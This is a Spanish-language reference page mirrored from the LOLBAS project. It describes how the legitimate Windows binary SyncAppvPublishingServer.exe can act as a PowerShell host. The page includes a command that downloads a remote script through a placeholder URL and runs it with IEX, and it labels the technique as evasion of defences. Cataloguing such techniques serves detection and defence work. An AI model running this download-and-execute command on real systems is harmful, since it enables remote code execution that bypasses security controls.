# LOLBAS: SyncAppvPublishingServer.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Used by App-v to get App-v server lists

## Comandos

### Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures

Execute · priv: User · T1218

```cmd
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

Example command on how inject Powershell code into the process

